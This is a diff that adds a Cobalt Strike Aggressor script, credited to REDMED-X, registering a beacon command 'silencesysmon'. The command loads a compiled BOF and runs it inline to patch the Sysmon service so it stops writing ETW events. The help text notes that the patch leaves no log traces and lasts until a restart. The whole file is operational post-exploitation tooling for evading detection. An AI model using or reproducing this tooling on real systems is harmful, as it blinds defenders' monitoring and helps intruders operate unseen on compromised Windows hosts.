@@ -1,0 +1,30 @@
+# author REDMED-X
+
+beacon_command_register(
+	"silencesysmon", "Silence Sysmon by patching its capability to write ETW events to the log.\n",
+	"INFO:\nSilence the Sysmon service by patching its capability to write ETW events to the log.\nRestarting the Sysmon service or the system itself will clear the patch and Sysmon will resume working normally.\nAltough this will not leave any traces in the log, there will be a time gap between the last and first new event.\n\nOPTIONS:\n[pid]: the process ID of the Sysmon service running on the system.\n\n" .
+	"USAGE:\nsilencesysmon <sysmon pid>\n\n");
+
+
+alias silencesysmon {
+    $bid = $1;
+    $pid = $2;
+
+	if ($pid eq "") {
+		berror($bid, "Please specify the process ID of the Sysmon service.\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("silencesysmon.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data  = bof_pack($bid, "i", $pid);
+
+	blog($bid, "Tasked to silence Sysmon..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
